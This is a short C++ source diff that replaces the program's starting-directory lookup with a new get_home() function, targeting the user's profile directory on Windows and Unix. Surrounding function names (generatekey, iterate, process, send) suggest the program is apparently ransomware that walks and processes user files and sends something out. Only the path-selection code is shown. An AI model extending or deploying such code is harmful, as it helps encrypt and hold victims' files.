@@ -21,6 +21,7 @@ crypt_data* generatekey();
 void iterate(const path& parent);
 void process(const path& path);
 string get_username();
+string get_home();
 void send();
 
 int main(int argc, char* argv[]) {
@@ -28,24 +29,8 @@ int main(int argc, char* argv[]) {
 
 #ifdef DEBUG
 	string path = ".";
-#elif defined(_WIN32)
-	string path;
-
-	char* drive = getenv("SystemDrive");
-	if (drive == nullptr) {
-		throw runtime_error("SystemDrive environment variable not found");
-	} else {
-		path = drive;
-	}
 #else
-	string path;
-
-	char* drive = getenv("HOME");
-	if (drive == nullptr) {
-		throw runtime_error("HOME environment variable not found");
-	} else {
-		path = drive;
-	}
+	string path = get_home();
 #endif
 
 	iterate(path);
@@ -153,6 +138,31 @@ string get_username() {
 	pw = getpwuid(uid);
 	if (pw) {
 		return string(pw->pw_name);
+	}
+
+	return EMPTY;
+#endif
+}
+
+string get_home() {
+#ifdef _WIN32
+	string path;
+
+	char* drive = getenv("USERPROFILE");
+	if (drive == nullptr) {
+		throw runtime_error("USERPROFILE environment variable not found");
+	} else {
+		path = drive;
+	}
+
+	return path;
+#else
+	struct passwd *pw;
+
+	uid_t uid = geteuid();
+	pw = getpwuid(uid);
+	if (pw) {
+		return string(pw->pw_dir);
 	}
 
 	return EMPTY;
